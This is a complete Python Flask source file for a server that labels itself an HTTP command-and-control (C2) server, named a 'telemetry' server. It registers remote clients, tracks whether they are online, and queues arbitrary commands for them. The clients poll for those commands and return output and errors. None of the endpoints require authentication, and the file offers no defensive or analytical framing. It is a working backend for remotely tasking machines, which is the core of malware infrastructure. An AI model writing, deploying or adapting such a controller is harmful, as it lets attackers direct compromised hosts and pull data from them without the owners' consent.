# ==================== telemetry_server.py ====================
"""
C2 Telemetry Server — HTTP command & control server

Python 3.10+
Requirements:
    pip install flask

Endpoints:
    POST /register      - Client registration
    POST /heartbeat     - Client heartbeat
    POST /log           - Log/telemetry ingestion
    GET  /list          - List registered clients
    GET  /logs/<id>     - Get client logs
    POST /task          - Submit task to client
    GET  /tasks/<id>    - Client polls for tasks
    POST /result        - Client submits task result
    GET  /results/<id>  - Get task result
    GET  /health        - Health check

Storage:
    ./logs/<client_id>.log
    ./tasks/<client_id>.json
    ./results/<task_id>.json
"""

from flask import Flask, request, jsonify, Response
from pathlib import Path
from datetime import datetime, timezone
import threading
import re
import time
import json
import uuid

app = Flask(__name__)

# ============================================================
# CONFIGURATION
# ============================================================

HOST = "0.0.0.0"
PORT = 8080

LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

TASKS_DIR = Path(__file__).resolve().parent / "tasks"
TASKS_DIR.mkdir(parents=True, exist_ok=True)

RESULTS_DIR = Path(__file__).resolve().parent / "results"
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

MAX_LOG_SIZE = 1_000_000
MAX_TASK_PAYLOAD = 1_000_000

clients = {}
clients_lock = threading.Lock()
file_lock = threading.Lock()

# ============================================================
# HELPERS
# ============================================================

def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()

def safe_client_id(client_id: str) -> str:
    """Sanitizes client ID to prevent path traversal"""
    client_id = str(client_id).strip()
    if not client_id:
        return "unknown"
    client_id = re.sub(r"[^a-zA-Z0-9._-]", "_", client_id)
    client_id = client_id[:100]
    return client_id or "unknown"

def log_path(client_id: str) -> Path:
    return LOG_DIR / f"{safe_client_id(client_id)}.log"

def task_queue_path(client_id: str) -> Path:
    return TASKS_DIR / f"{safe_client_id(client_id)}.json"

def result_path(task_id: str) -> Path:
    return RESULTS_DIR / f"{safe_client_id(task_id)}.json"

def append_log(client_id: str, message: str) -> None:
    path = log_path(client_id)
    entry = f"[{utc_now()}] {message.rstrip()}\n"
    with file_lock:
        with path.open("a", encoding="utf-8") as fp:
            fp.write(entry)

def get_json():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return None
    return data

def load_task_queue(client_id: str) -> list:
    path = task_queue_path(client_id)
    with file_lock:
        if not path.exists():
            return []
        try:
            with path.open("r", encoding="utf-8") as fp:
                return json.load(fp)
        except (json.JSONDecodeError, IOError):
            return []

def save_task_queue(client_id: str, tasks: list) -> None:
    path = task_queue_path(client_id)
    with file_lock:
        with path.open("w", encoding="utf-8") as fp:
            json.dump(tasks, fp, indent=2)

def push_task(client_id: str, task: dict) -> None:
    queue = load_task_queue(client_id)
    queue.append(task)
    save_task_queue(client_id, queue)

def pop_pending_task(client_id: str) -> dict | None:
    queue = load_task_queue(client_id)
    if not queue:
        return None
    task = queue.pop(0)
    save_task_queue(client_id, queue)
    return task

# ============================================================
# ENDPOINTS
# ============================================================

@app.post("/register")
def register():
    """Client registration endpoint"""
    data = get_json()
    if data is None:
        return jsonify({"status": "error", "message": "JSON body required"}), 400
    client_id = safe_client_id(data.get("client_id", ""))
    if client_id == "unknown":
        return jsonify({"status": "error", "message": "client_id required"}), 400
    now = time.time()
    with clients_lock:
        clients[client_id] = {
            "last_seen": now,
            "registered_at": clients.get(client_id, {}).get("registered_at", now)
        }
    append_log(client_id, "client registered")
    print(f"[+] Registered: {client_id}")
    return jsonify({"status": "ok", "client_id": client_id})

@app.post("/heartbeat")
def heartbeat():
    """Client heartbeat endpoint"""
    data = get_json()
    if data is None:
        return jsonify({"status": "error", "message": "JSON body required"}), 400
    client_id = safe_client_id(data.get("client_id", ""))
    if client_id == "unknown":
        return jsonify({"status": "error", "message": "client_id required"}), 400
    now = time.time()
    with clients_lock:
        if client_id not in clients:
            clients[client_id] = {"last_seen": now, "registered_at": now}
        else:
            clients[client_id]["last_seen"] = now
    return jsonify({"status": "ok"})

@app.post("/log")
def submit_log():
    """Log/telemetry ingestion endpoint"""
    data = get_json()
    if data is None:
        return jsonify({"status": "error", "message": "JSON body required"}), 400
    client_id = safe_client_id(data.get("client_id", ""))
    message = data.get("message", "")
    if client_id == "unknown":
        return jsonify({"status": "error", "message": "client_id required"}), 400
    if not isinstance(message, str):
        return jsonify({"status": "error", "message": "message must be a string"}), 400
    if not message:
        return jsonify({"status": "error", "message": "message required"}), 400
    if len(message) > MAX_LOG_SIZE:
        return jsonify({"status": "error", "message": f"message exceeds {MAX_LOG_SIZE} characters"}), 413
    now = time.time()
    with clients_lock:
        if client_id not in clients:
            clients[client_id] = {"last_seen": now, "registered_at": now}
        else:
            clients[client_id]["last_seen"] = now
    append_log(client_id, message)
    print(f"[LOG] {client_id}: {message[:100]}")
    return jsonify({"status": "ok"})

@app.post("/task")
def submit_task():
    """Submit task to client"""
    data = get_json()
    if data is None:
        return jsonify({"status": "error", "message": "JSON body required"}), 400
    client_id = safe_client_id(data.get("client_id", ""))
    if client_id == "unknown":
        return jsonify({"status": "error", "message": "client_id required"}), 400
    command = data.get("command", "")
    if not isinstance(command, str) or not command:
        return jsonify({"status": "error", "message": "command required"}), 400
    args = data.get("args", "")
    timeout = data.get("timeout", 30)
    task = {
        "task_id": str(uuid.uuid4()),
        "command": command,
        "args": args,
        "timeout": timeout,
        "created_at": utc_now(),
        "status": "pending"
    }
    if len(json.dumps(task)) > MAX_TASK_PAYLOAD:
        return jsonify({"status": "error", "message": "task payload too large"}), 413
    push_task(client_id, task)
    append_log(client_id, f"task queued: {task['task_id']}")
    print(f"[TASK] Queued {task['task_id']} for {client_id}")
    return jsonify({"status": "ok", "task_id": task["task_id"]})

@app.get("/tasks/<client_id>")
def get_tasks(client_id):
    """Client polls for pending tasks"""
    client_id = safe_client_id(client_id)
    task = pop_pending_task(client_id)
    if task is None:
        return jsonify({"status": "ok", "task": None})
    append_log(client_id, f"task fetched: {task['task_id']}")
    print(f"[TASK] {client_id} fetched {task['task_id']}")
    return jsonify({"status": "ok", "task": task})

@app.post("/result")
def submit_result():
    """Client submits task result"""
    data = get_json()
    if data is None:
        return jsonify({"status": "error", "message": "JSON body required"}), 400
    task_id = data.get("task_id", "")
    client_id = safe_client_id(data.get("client_id", ""))
    status = data.get("status", "unknown")
    output = data.get("output", "")
    error = data.get("error", "")
    if not task_id:
        return jsonify({"status": "error", "message": "task_id required"}), 400
    if client_id == "unknown":
        return jsonify({"status": "error", "message": "client_id required"}), 400
    result = {
        "task_id": task_id,
        "client_id": client_id,
        "status": status,
        "output": output,
        "error": error,
        "completed_at": utc_now()
    }
    path = result_path(task_id)
    with file_lock:
        with path.open("w", encoding="utf-8") as fp:
            json.dump(result, fp, indent=2)
    append_log(client_id, f"result submitted: {task_id}")
    print(f"[RESULT] {task_id} from {client_id}: {status}")
    return jsonify({"status": "ok"})

@app.get("/results/<task_id>")
def get_result(task_id):
    """Get task result"""
    task_id = safe_client_id(task_id)
    path = result_path(task_id)
    if not path.exists():
        return jsonify({"status": "error", "message": "result not found"}), 404
    with file_lock:
        contents = path.read_text(encoding="utf-8")
    try:
        result = json.loads(contents)
    except json.JSONDecodeError:
        return jsonify({"status": "error", "message": "corrupt result"}), 500
    return jsonify(result)

@app.get("/list")
def list_clients():
    """List registered clients"""
    now = time.time()
    with clients_lock:
        result = {}
        for client_id, info in clients.items():
            last_seen = info["last_seen"]
            result[client_id] = {
                "registered_at": datetime.fromtimestamp(info["registered_at"], timezone.utc).isoformat(),
                "last_seen": datetime.fromtimestamp(last_seen, timezone.utc).isoformat(),
                "online": (now - last_seen) < 30
            }
    return jsonify(result)

@app.get("/logs/<client_id>")
def get_logs(client_id):
    """Get client logs"""
    client_id = safe_client_id(client_id)
    path = log_path(client_id)
    if not path.exists():
        return jsonify({"client_id": client_id, "logs": []})
    with file_lock:
        contents = path.read_text(encoding="utf-8")
    return Response(contents, mimetype="text/plain; charset=utf-8")

@app.get("/health")
def health():
    """Health check endpoint"""
    return jsonify({"status": "ok", "time": utc_now()})

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print(f"[*] C2 server: http://{HOST}:{PORT}")
    print(f"[*] Log directory: {LOG_DIR}")
    print(f"[*] Tasks directory: {TASKS_DIR}")
    print(f"[*] Results directory: {RESULTS_DIR}")
    app.run(host=HOST, port=PORT, threaded=True)
